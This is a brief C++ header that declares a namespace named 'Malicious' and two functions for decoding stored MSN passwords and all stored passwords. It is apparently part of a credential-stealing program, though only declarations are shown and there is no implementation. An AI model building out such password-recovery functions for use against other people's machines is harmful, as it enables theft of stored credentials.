#pragma once

#include <string>
#include <exception>

namespace Malicious
{
    class ErrorWhileRetrieving : public std::exception {};
	std::string decodeMsnPasswords(char delimiter);
    std::string decodeAllPasswords(char delimiter);

} // Malicious
